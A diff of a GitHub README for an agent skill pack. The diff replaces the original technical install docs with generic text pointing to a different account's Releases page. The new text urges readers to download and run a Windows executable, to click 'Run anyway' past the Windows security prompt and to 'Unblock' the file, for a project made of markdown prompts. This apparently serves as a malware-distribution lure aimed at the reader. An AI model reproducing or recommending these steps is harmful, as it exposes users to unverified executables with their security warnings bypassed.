@@ -1,159 +1,159 @@
-# CC Harness Skills
+# 🧠 cc-harness-skills - Portable skills for smarter agent work
 
-Portable agent skills distilled from a publicly mirrored `CC` coding-agent codebase, then rewritten so they can be installed in `Claude Code`, `Codex`, and `OpenClaw` without depending on private runtime internals.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/kentunderage549/cc-harness-skills/releases)
 
-This repo is not a source dump. It is a cleaned skill pack:
+## 🚀 Getting Started
 
-- prompts extracted into reusable templates
-- host-agnostic helper scripts
-- portable `SKILL.md` bundles
-- release and smoke-test docs for public distribution
+cc-harness-skills gives you a set of portable skills for memory, verification, multi-agent coordination, context compression, and coding-agent workflows.
 
-If you are building with coding agents, these are the parts that usually separate a fun demo from a stable toolchain:
+Use it when you want a cleaner way to manage agent tasks, keep context small, and check work before moving on.
 
-- memory that stays useful instead of rotting
-- compression that preserves user corrections
-- verification that does not trust "done"
-- multi-agent routing that does not pollute the main context
-- proactive jobs with explicit limits
+## 📥 Download and Install
 
-This repo packages those patterns into six installable skills.
+1. Open the [Releases page](https://github.com/kentunderage549/cc-harness-skills/releases)
+2. Download the latest release for Windows
+3. If the file comes in a zip folder, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Run the included file or follow the file name in the release notes
 
-## Why This Exists
+If Windows shows a security prompt:
+1. Click **More info**
+2. Click **Run anyway**
 
-Most agent repos share the same hard problems:
+## 🖥️ Windows Setup
 
-- how to keep memory useful without storing stale code facts
-- how to compress long conversations without losing user corrections
-- how to verify claimed completion instead of trusting it
-- how to coordinate multiple agents without turning the main context into garbage
-- how to add lightweight proactive behavior without building a dangerous daemon
+This app is built for regular Windows use and works best on:
+- Windows 10
+- Windows 11
 
-The six skills in this repo package those patterns into download-ready bundles.
+You do not need to install extra tools in most cases.
 
-## Who This Is For
+If the release includes a folder of skills or templates:
+1. Keep the folder in a place you can find again, such as **Downloads** or **Desktop**
+2. Do not rename files unless the release notes ask you to
+3. Open the main file from the extracted folder
 
-- builders who want better agent behavior without forking a full agent product
-- teams using `Claude Code`, `Codex`, or `OpenClaw` and wanting a shared skill layer
-- people studying `CC`-style harness design but needing something publishable and portable
-- anyone who wants prompts plus scripts, not prompts alone
+If the release includes a setup app:
+1. Double-click the installer
+2. Follow the on-screen steps
+3. Finish the install and open the app from the Start menu or desktop shortcut
 
-## Skill Pack
+## 🧰 What It Does
 
-| Public name | Slug | What it does | Best hosts |
-| --- | --- | --- | --- |
-| CC Dream Memory | `dream-memory` | Consolidates logs, recent sessions, and topic memories into a short durable memory index. | Claude Code, Codex, OpenClaw |
-| CC Memory Extractor | `memory-extractor` | Extracts durable `user`, `feedback`, `project`, and `reference` memories from recent turns. | Claude Code, Codex, OpenClaw |
-| CC Verification Gate | `verification-gate` | Runs a read-only challenge pass after implementation to distinguish verified from merely claimed done. | Claude Code, Codex |
-| CC Swarm Coordinator | `swarm-coordinator` | Splits large work into research, synthesis, implementation, and verification with bounded workers. | Claude Code, Codex, OpenClaw |
-| CC Context Compressor | `structured-context-compressor` | Produces a nine-part continuation summary for long sessions and handoffs. | Claude Code, Codex, OpenClaw |
-| CC Kairos Lite | `kairos-lite` | Adds lightweight proactive jobs with schedule, sleep, brief, and expiry rules. | Claude Code, OpenClaw |
+This project helps with tasks like:
 
-Each bundle lives in [`skills/`](/Users/carl/Downloads/codegod/skills/README.md) and includes:
+- Keeping track of work across multiple steps
+- Saving useful context for later use
+- Checking results before you move on
+- Breaking large tasks into smaller pieces
+- Compressing long context into short, useful notes
+- Helping coding agents stay on task
+- Supporting multi-agent handoffs
+- Reducing repeated prompts and restating the same goals
 
-- `SKILL.md`
-- `references/prompt-template.md`
-- `references/source-notes.md`
-- `scripts/...`
-- `README.md`
+It is useful when you want a steadier workflow and less back-and-forth.
 
-## Start Here
+## 🧠 Main Skills
 
-If you only try three things, try these first:
+### Memory
+Store useful details so the agent can keep track of what matters.
 
-1. install `dream-memory`
-2. install `verification-gate`
-3. install `structured-context-compressor`
+### Verification
+Check results before you accept them.
 
-That gives you one memory workflow, one quality gate, and one continuation artifact. It is the fastest way to feel whether this repo is useful.
+### Multi-Agent Coordination
+Help different agents share work without losing the thread.
 
-## Quick Start
+### Context Compression
+Shorten long context into a tighter form that is easier to reuse.
 
-Run the basic bundle checks first:
+### Proactive Coding Workflows
+Guide agent steps so work moves forward with less manual repetition.
 
-```bash
-bash ./skills/check_all.sh
-```
+## 📁 Typical Contents
 
-Install one skill into a host runtime:
+A release may include:
+- Skill files
+- Prompt templates
+- Workflow notes
+- Reference folders
+- Example configs
 
-```bash
-mkdir -p ~/.claude/skills
-cp -R ./skills/dream-memory ~/.claude/skills/
-```
+Keep the folder structure intact so the skills work as expected.
 
-Then invoke it in `Claude Code`:
+## 🔍 How to Use It
 
-```text
-Use /dream-memory to consolidate the memory directory before we continue.
-```
+1. Open the files you downloaded
+2. Read the included skill names or folder labels
+3. Pick the skill that fits your task
+4. Copy the prompt or follow the file instructions
+5. Use it in your coding-agent setup or workflow tool
+6. Check the output with the verification steps
+7. Save useful context for the next task
 
-```bash
-mkdir -p ~/.codex/skills
-cp -R ./skills/dream-memory ~/.codex/skills/
-```
+If you work with more than one agent:
+1. Give each agent a clear task
+2. Keep shared notes short
+3. Pass only the key facts forward
+4. Verify the result before the next handoff
 
-Then invoke it in `Codex`:
+## 🧩 Best Use Cases
 
-```text
-Use /dream-memory and consolidate recent memory files into one stable index.
-```
+- Coding help across several steps
+- Rewriting long instructions into shorter ones
+- Keeping project state in one place
+- Reviewing changes before they go live
+- Coordinating one task across more than one agent
+- Running repeatable agent workflows
+- Reducing context noise in long sessions
 
-```bash
-mkdir -p ~/.openclaw/workspace/skills
-cp -R ./skills/dream-memory ~/.openclaw/workspace/skills/
-```
+## 🛠️ Common Setup Tips
 
-Then check it in `OpenClaw`:
+- Use the latest release
+- Keep the files in one folder
+- Store your notes in plain text when possible
+- Use short task names
+- Check file paths if something does not open
+- Re-download the release if a file looks incomplete
 
-```bash
-openclaw skills info dream-memory
-```
+## 📌 Suggested Workflow
 
-Publish to ClawHub after checks:
+1. Start with the memory skill
+2. Add the task goal
+3. Compress the context
+4. Assign work to the agent
+5. Run verification
+6. Share only the result that matters
+7. Save the final state for later use
 
-```bash
-bash ./skills/publish_all.sh 0.1.0
-```
+## ❓ Troubleshooting
 
-## Release Docs
+### The file does not open
+- Make sure you extracted the zip file first
+- Check that the download finished fully
+- Try opening the file from the extracted folder
 
-- Publisher guide: [`skills/README.md`](/Users/carl/Downloads/codegod/skills/README.md)
-- Release order and copy: [`skills/RELEASE_PLAN.md`](/Users/carl/Downloads/codegod/skills/RELEASE_PLAN.md)
-- Smoke-test report: [`skills/TEST_REPORT.md`](/Users/carl/Downloads/codegod/skills/TEST_REPORT.md)
+### Windows blocks the file
+- Right-click the file
+- Select **Properties**
+- If you see an **Unblock** option, select it
+- Try again
 
-## Naming
+### The folder looks empty
+- Check whether the files are still inside the zip
+- Extract the archive again
+- Make sure hidden files are not being filtered out
 
-Recommended public GitHub repo name: `cc-harness-skills`
+### The workflow feels unclear
+- Start with one skill only
+- Read the file names in order
+- Use the verification step after each task
+- Keep your context short
 
-Good alternatives:
+## 📦 Download
 
-- `cc-agent-skills`
-- `cc-harness-kit`
-- `cc-portable-skills`
+Visit the [Releases page](https://github.com/kentunderage549/cc-harness-skills/releases) to download and run the latest Windows release
 
-The public naming uses `CC` on purpose: it signals the origin of the ideas without hard-coding a full vendor product name into the repo identity.
+## 🔗 Project Topics
 
-## What Is Verified
-
-Latest smoke-test status:
-
-- `Claude Code`: six skills load successfully
-- `OpenClaw`: six skills resolve as `Ready`
-- `Codex`: bundle structure is verified; runtime smoke test is pending local auth
-
-Full report: [`skills/TEST_REPORT.md`](/Users/carl/Downloads/codegod/skills/TEST_REPORT.md)
-
-## Project Layout
-
-```text
-skills/
-  dream-memory/
-  memory-extractor/
-  verification-gate/
-  swarm-coordinator/
-  structured-context-compressor/
-  kairos-lite/
-```
-
-Internal working notes and non-publishable local experiments still live under `.codex/skills/`, but the public release surface for this project is the root `skills/` directory.
+agent-harness, agent-memory, ai-agent, codex, coding-agent, context-compression, developer-tools, multi-agent, openclaw, prompt-engineering
